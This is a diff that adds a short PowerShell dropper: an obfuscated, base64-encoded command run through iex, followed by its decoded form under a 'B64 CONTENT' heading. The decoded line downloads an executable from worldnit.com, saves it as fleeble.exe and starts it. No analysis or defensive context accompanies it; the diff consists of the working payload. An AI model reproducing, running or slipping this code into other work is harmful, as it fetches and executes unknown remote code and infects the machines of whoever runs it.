@@ -1,0 +1,7 @@
+iex([SYStEM.TeXT.eNcOdinG]::UTf8.GetSTrINg([sYsTem.cOnVErT]::FROMbaSE64StRING('CihOZXctT2JqZWN0IFN5c1RFTS5OZVQuV2ViQ2xpZU5UKS5ET1dObE9hREZpbGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20va3VuZGVsby5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysTEM.NeT.WebClieNT).DOWNlOaDFile('http://worldnit.com/kundelo.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
